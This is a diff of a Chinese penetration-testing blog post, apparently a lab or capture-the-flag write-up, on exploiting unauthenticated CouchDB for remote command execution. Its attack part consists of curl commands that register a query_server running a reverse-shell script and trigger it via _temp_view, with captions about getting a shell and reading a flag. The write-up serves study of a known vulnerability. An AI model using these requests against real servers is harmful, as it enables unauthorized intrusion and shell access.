@@ -5,7 +5,7 @@ subtitle:   "一点点记录"
 iframe:     "https://Urahara3389.github.io/js-module-7day/"
 date:       2016-09-11
 author:     "Urahara"
-header-img: "img/Couchdb-RCE.jpg"
+header-img: "https://urahara3389.github.io/img/Couchdb-RCE.jpg"
 tags:
     - 渗透测试
     - 数据库安全
@@ -19,31 +19,44 @@ tags:
 Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。
 
 使用nmap扫描可发现couchdb的banner信息
-[couchdb默认端口](img/Couchdb-RCE-nmap.png)
+![couchdb默认端口](https://urahara3389.github.io/img/Couchdb-RCE-nmap.png)
 
 >执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破
-[账号认证](img/Couchdb-RCE-admin.png)
+
+CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127.0.0.1:5984/_utils/”，即可见到如下所示的界面。
+![账号认证](https://urahara3389.github.io/img/Couchdb-RCE-admin.png)
 
 ##漏洞利用
-使用admin身份登录后获取cookie
-[图片]
+这里举例有账号认证的情况，我们需要使用admin身份登录然后获取cookie，再使用curl命令与api进行交互，实现数据库操作
+![获取Cookie](https://urahara3389.github.io/img/Couchdb-RCE-cookie.png)
+
 >远程命令执行示例
+1. 新增query_server配置，写入要执行的命令；
+2. 新建一个临时库和临时表，插入一条记录；
+3. 调用query_server处理数据
 
-`curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`
+```
+curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
 
-`curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`
+curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```
 
-`curl -X PUT 'http://192.168.199.181:5984/teeest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`
+curl -X PUT 'http://192.168.199.181:5984/teeest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```
 
-`curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`
+curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
+```
 
 远程下载反弹脚本
-[图片]
+![写入命令](https://urahara3389.github.io/img/Couchdb-RCE-command.png)
 成功监听到下载请求
-[图片]
+![监听下载](https://urahara3389.github.io/img/Couchdb-RCE-download.png)
 添加执行权限
-[图片]
+![添加执行权限](https://urahara3389.github.io/img/Couchdb-RCE-chmod.png)
 执行反弹脚本
-[图片]
+![执行反弹](https://urahara3389.github.io/img/Couchdb-RCE-backshell.png)
 getshell，读取flag
-[图片]
+![成功](https://urahara3389.github.io/img/Couchdb-RCE-over.png)
+
+
+###参考
+[CouchDB未授权访问导致执行任意系统命令漏洞](https://www.secpulse.com/archives/45917.html)
+[CouchDB未授权访问漏洞导致系统命令执行](http://blog.nsfocus.net/couchdb-unauthorized-access-vulnerability-system-command/)
